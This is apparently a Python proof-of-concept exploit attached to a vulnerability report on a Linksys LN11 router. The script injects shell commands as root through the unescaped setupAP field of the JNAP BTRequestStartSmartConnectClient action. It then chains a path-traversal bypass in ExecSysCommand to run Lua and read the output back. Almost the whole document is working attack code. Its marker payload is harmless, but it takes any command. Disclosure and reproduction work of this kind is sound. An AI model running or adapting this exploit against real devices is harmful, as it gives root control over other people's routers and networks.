#!/usr/bin/env python3
"""PoC for report-3: command injection in btsmartconnect BTRequestStartSmartConnectClient.

The setupAP field is concatenated unescaped into a root-executed
sh -c "... run_central.sh ... -S <setupAP>"; x$(command)y executes as root.
Readback via the ExecSysCommand lua bypass (report-6) as an independent channel.

usage:
  set LN11_HOST=192.168.x.x
  set LN11_ADMIN_PASSWORD=<password>
  py -3 poc.py

For owned devices only. Injected command must not contain ")" or a single quote.
Self-contained: stdlib only.
"""
import base64
import http.client
import json
import os
import ssl
import time

ACTION = "http://linksys.com/jnap/nodes/btsmartconnect/BTRequestStartSmartConnectClient"
FIELD = "setupAP"
EXE = "http://linksys.com/jnap/diagnostics/ExecSysCommand"
TRAV = "/lib/libnl/cli/cls/../../../../usr/bin/lua"
MARK = "/tmp/bt_pwned_LN11"


def jnap(action, obj, timeout=15.0):
    host = os.environ.get("LN11_HOST", "192.168.1.1")
    pw = os.environ["LN11_ADMIN_PASSWORD"]
    auth = base64.b64encode(f"admin:{pw}".encode()).decode()
    body = json.dumps(obj, separators=(",", ":")).encode()
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    c = http.client.HTTPSConnection(host, 443, timeout=timeout, context=ctx)
    try:
        c.request("POST", "/JNAP/", body=body, headers={
            "X-JNAP-Action": action,
            "X-JNAP-Authorization": f"Basic {auth}",
            "Content-Type": "application/json; charset=UTF-8"})
        r = c.getresponse()
        return r.read(1024 * 1024).decode("utf-8", "replace")
    finally:
        c.close()


def inject(cmd):
    payload = "x$(" + cmd + ")y"
    for _ in range(6):  # retry on single-instance BT central guard
        body = jnap(ACTION, {FIELD: payload})
        if "ErrorBTCentralAlreadyWorking" in body or "RequestIsAlreadyInProgress" in body:
            time.sleep(2.0)
            continue
        return body
    return body


def lua_exec(code):
    body = jnap(EXE, {"cmd": TRAV, "param": "-e " + code})
    try:
        return json.loads(body)["output"]["cmdresult"]
    except Exception:
        return ""


def main():
    print(f"[1] {ACTION.split('/')[-1]} setupAP=x$(...)y")
    print("    resp:", inject(f"id>{MARK};uptime>>{MARK}")[:100])
    time.sleep(1.0)
    out = lua_exec(f'local f=io.popen("cat {MARK}") print(f:read("*a"))')
    print(f"[2] readback {MARK}:\n{out or '(empty)'}")
    inject(f"rm -f {MARK}")
    ok = "uid=0" in out
    print("[+] ROOT EXECUTION CONFIRMED" if ok else "[-] not confirmed")
    return 0 if ok else 1


if __name__ == "__main__":
    raise SystemExit(main())
